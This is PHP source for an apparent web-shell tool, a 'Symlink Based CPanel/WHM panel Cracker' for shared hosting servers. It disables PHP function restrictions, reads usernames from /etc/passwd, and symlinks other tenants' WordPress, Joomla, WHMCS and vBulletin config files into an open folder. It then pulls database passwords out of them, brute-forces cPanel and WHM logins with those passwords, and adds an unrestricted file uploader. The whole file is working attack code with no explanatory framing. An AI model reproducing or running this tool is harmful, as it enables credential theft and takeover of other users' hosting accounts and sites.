<?php

$head = '
<html>
<head>
</script>
<title>Symlink Based CPanel/WHM panel Cracker</title>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT: Black 1px solid;
BORDER-TOP: #DF0000 1px solid;
BORDER-LEFT: #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>



<h2><center>Symlink Based CPanel/WHM panel Cracker</center></h2>
<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>

<?php
echo $head ;
echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

</td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="arial"size="1"><b>

';

?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="arial">
<form method=post>
<input type=submit name=ini value="Generate PHP.ini" /></form>
<?php
if(isset($_POST['ini']))
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link="<a href=php.ini><font color=white size=2 face=\"arial\"><u>link to php.ini file</u></font></a>";
echo $link;

}
?>
<?php

?>
<form method=post>
<input type=submit name="usre" value="Extract Usernames" /></form>




<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value="Start" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"arial\">";
if(isset($_POST['su']))
{

$dir=mkdir('BT',0777);
$r = " Options all \n DirectoryIndex BT.html \n Require None \n Satisfy Any";
$f = fopen('BT/.htaccess','w');

fwrite($f,$r);
$consym="<a href=BT/><font color=white size=3 face=\"arial\">Configuration files</font></a>";
echo "<br>Folder Where Config Files has been Symlinked<br><u><font color=red size=2 face=\"arial\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="BT/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>
<?php

?>

<form method=post>
<input type=submit name=sm value="Grab Passwords from Configuration files"></form>
<?php
error_reporting(0);
set_time_limit(0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

if(isset($_POST['sm']))

{

echo '<font color=green>OK++';

$ffile=fopen('BT.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/BT/";
$re=$r;
$confi=array("..wp-config","..word-wp","..wpblog","..config","..admin-conf","..vb","..joomla-or-whmcs","..joomla","..vbinc","..whm","..whmcs","..supporwhmcs","..WHM","..whmc","..WHMcs","..whmcsupp","..whmcs-cli","..whmcs-cl","..whmcs-CL","..whmcs-Cl","..whmcs-csup","..whmcs-bill");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> $usersss  User's CMS is Wordpress </font></td></tr></table>";

 echo $dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> $usersss  User's CMS is Whmcs </font></td></tr></table>";

echo $dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> $usersss  User's CMS is Joomla </font></td></tr></table>";

echo $db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> $usersss  User's CMS is vbulletin </font></td></tr></table>";

echo $db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> Got Config File for Unknwon CMS of User $usersss </font></td></tr></table>";

echo $db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> Got Config File for Unknwon CMS of User $usersss </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> Got Config File for Unknwon CMS of User $usersss </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='arial'> Got Config File for Unknwon CMS of User $usersss </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
}
?>
<?php

?>


<form method=post>
<input type=submit name=cpanel value="Auto CPanel/WHM panel cracker"><p>
<?php

if(isset($_POST['cpanel']))
{
?>
<form method=post><div align=center><table>
want to brute=><select name="op"> <option name="op" value="cp">CPanel</option>
<option name="op" value="whm">WHMPanel</option></table><p>
<textarea style="background:black;color:white" rows=20 cols=25 name=usernames ><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><textarea style="background:black;color:white" rows=20 cols=25 name=passwords >
<?php

$d=getcwd()."/BT.txt";
$pf=file($d);
foreach($pf as $rt)
{
$str=explode('\n',$rt);
echo trim($str[0])."\n";
} ?></textarea><p>
<input type=submit name=cpanelcracking value="Start"></form>
<?php
}
?>




<?php
error_reporting(0);
$connect_timeout=5;
set_time_limit(0);

$userl=$_POST['usernames'];
$passl=$_POST['passwords'];
$attack=$_POST['op'];
$target = "localhost";

if(isset($_POST['cpanelcracking']))
{
if($userl!=="" && $passl!=="")
{
if($_POST["op"]=="cp")
{
$cracked=$_POST['crack'];
@fopen($cracked,'a');
echo "Attacking CPanel....please wait till the end of process \n";


}
elseif($_POST["op"]=="whm")
{
@fopen($cracked,'a');
echo "Attacking WHM panel....please wait till the end of process";

}

function cpanel($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b></font>

<font color=red size=2> Cracked </font>

<font color=white size=2> Username is </font>

<font color=green size=2> $user</font>

<font color=red size=2> & </font>

<font color=white size=2> Password is </font>

<font color=green size=2> $pass </font>

</font></b></td></tr></table>";

}

curl_close($ch);}

$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);

if ($attack == "cp")
{
foreach ($userlist as $user) {
echo "<div align=center><table width=80% ><tr><td align=center><b><font color=red size=1>Attacking user $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);


cpanel($target,$finaluser,$finalpass,$connect_timeout);

}
}

}

function whm($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2086");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b></font>

<font color=red size=2> Cracked </font>

<font color=white size=2> Username is </font>

<font color=green size=2> $user</font>

<font color=red size=2> & </font>

<font color=white size=2> Password is </font>

<font color=green size=2> $pass </font>

</font></b></td></tr></table>";




}


curl_close($ch);}
$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);

if ($attack == "whm")
{
foreach ($userlist as $user) {
echo "<div align=center><table width=80% ><tr><td align=center><b><font color=red size=1>user under attack is $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);

whm($target,$finaluser,$finalpass,$connect_timeout);
}
}
}
}
elseif($userl=="")
{
echo "you have left userlist field empty";

}
elseif($passl=="")
{

echo "please put passwords in paasword list field";
}
}
?>


<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>